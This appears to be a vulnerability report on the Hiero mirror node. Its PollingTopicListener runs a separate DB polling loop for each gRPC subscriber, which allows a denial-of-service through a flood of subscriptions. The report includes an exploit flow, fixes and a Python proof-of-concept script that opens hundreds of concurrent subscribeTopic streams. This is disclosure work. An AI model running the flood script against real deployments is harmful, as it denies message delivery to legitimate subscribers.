### Title
Unbounded Per-Subscriber DB Polling in `PollingTopicListener` Enables DoS via Subscription Flood

### Summary
`PollingTopicListener.listen()` creates a completely independent `PollingContext` and DB polling loop for every subscriber, with no global subscription cap or shared query mechanism. An unprivileged attacker opening many gRPC connections — each with up to 5 concurrent subscriptions — multiplies DB queries linearly per polling interval, exhausting DB capacity and causing query timeouts that result in missed topic messages.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` at [1](#0-0)  creates a new `PollingContext` on line 35 for every call, then constructs an independent `Flux.defer(() -> poll(context))` loop that fires a DB query every `interval` (default 500ms). This is a cold publisher — there is no sharing between subscribers.

Each `poll()` call at [2](#0-1)  issues a `topicMessageRepository.findByFilter(newFilter)` — a full DB query — independently per subscriber.

The `PollingContext` inner class at [3](#0-2)  holds per-subscription `count` and `last` state, confirming complete isolation between subscribers.

**The only per-connection limit** is `maxConcurrentCallsPerConnection = 5` in `NettyProperties`: [4](#0-3)  enforced via [5](#0-4) 

This is a **per-connection** limit, not a global one. There is no cap on total connections or total subscriptions server-wide in the gRPC layer.

**Root cause / failed assumption:** The design assumes that the number of concurrent subscribers will be small enough that independent per-subscriber DB polling is acceptable. There is no global subscription counter, no admission control, and no query sharing (unlike `SharedPollingTopicListener` which uses `.share()` at [6](#0-5)  to multiplex all subscribers onto a single poll loop).

**Exploit flow:**
1. Attacker opens C gRPC connections to the mirror node.
2. On each connection, attacker opens 5 concurrent `subscribeTopic` calls (the per-connection max).
3. Total active subscriptions = 5 × C, each independently polling the DB every 500ms.
4. DB receives `5 × C` queries per 500ms interval, each potentially scanning up to `maxPageSize = 5000` rows via the CTE join query in `TopicMessageRepository.findLatest()`: [7](#0-6) 
5. DB connection pool and query capacity are exhausted; queries begin timing out (configured `statementTimeout = 10000ms`).
6. Legitimate subscribers receive no messages during timeout windows — fund-transfer topic messages are missed.

### Impact Explanation

When `listener.type=POLL` is configured, every missed DB poll interval means topic messages published during that window are not delivered to subscribers. For financial topics carrying fund-transfer messages, this constitutes a denial-of-service against message delivery. The DB `statementTimeout` of 10 seconds means a sustained flood can cause continuous delivery gaps. The impact is availability loss for all subscribers, not just the attacker's own subscriptions.

### Likelihood Explanation

**Precondition:** The operator must have configured `hiero.mirror.grpc.listener.type=POLL`. The default is `REDIS`, so this only affects deployments that explicitly opt into polling mode. However, `POLL` is a documented, supported configuration option. An attacker needs no credentials — gRPC `subscribeTopic` is an unauthenticated public API. Opening hundreds of TCP connections and 5 subscriptions each requires only a script and network access. The attack is trivially repeatable and requires no special knowledge beyond the public gRPC proto definition.

### Recommendation

1. **Primary fix:** When `POLL` mode is required, replace `PollingTopicListener` with `SharedPollingTopicListener` (type `SHARED_POLL`), which uses a single shared DB poll loop for all subscribers via `.share()`, making DB load O(1) regardless of subscriber count.
2. **Defense-in-depth:** Add a global concurrent-subscription counter (e.g., `AtomicInteger`) in the gRPC service layer and reject new subscriptions above a configurable threshold.
3. **Connection-level limiting:** Add a global maximum connections limit at the Netty server level (e.g., `serverBuilder.maxConnectionAge(...)` or an IP-based connection rate limit at the load balancer).
4. **Document the risk:** Explicitly warn in configuration docs that `type=POLL` does not share DB queries across subscribers and is unsuitable for public-facing deployments without connection limits.

### Proof of Concept

```python
import grpc
import threading
from concurrent.futures import ThreadPoolExecutor

# Public proto: com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
# Target: mirror node configured with listener.type=POLL

NUM_CONNECTIONS = 100
CALLS_PER_CONNECTION = 5  # maxConcurrentCallsPerConnection default

def flood_connection(_):
    channel = grpc.insecure_channel("mirror-node-host:5600")
    stub = ConsensusServiceStub(channel)
    threads = []
    for _ in range(CALLS_PER_CONNECTION):
        req = ConsensusTopicQuery(topicID=TopicID(topicNum=TARGET_TOPIC))
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(req)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# Result: 100 * 5 = 500 independent DB queries every 500ms
# Each query: CTE join on transaction + topic_message tables, up to 5000 rows
# DB load: 1000 queries/second sustained → connection pool exhaustion → timeouts
with ThreadPoolExecutor(max_workers=NUM_CONNECTIONS) as ex:
    list(ex.map(flood_connection, range(NUM_CONNECTIONS)))
```

Steps:
1. Deploy mirror node with `hiero.mirror.grpc.listener.type=POLL`.
2. Run the script above from any network-accessible host.
3. Observe DB CPU/connection metrics spike; observe legitimate subscribers stop receiving messages during the flood.
4. Stop the script; observe DB recovers and message delivery resumes — confirming the DoS is caused by the subscription flood.

    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
    }

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }

    private class PollingContext {

        private final TopicMessageFilter filter;
        private final AtomicLong count = new AtomicLong(0L);
        private final AtomicReference<@Nullable TopicMessage> last = new AtomicReference<>();

        void onNext(TopicMessage topicMessage) {
            last.set(topicMessage);
            count.incrementAndGet();
        }

        private @Nullable TopicMessage getLast() {
            return last.get();
        }
    }
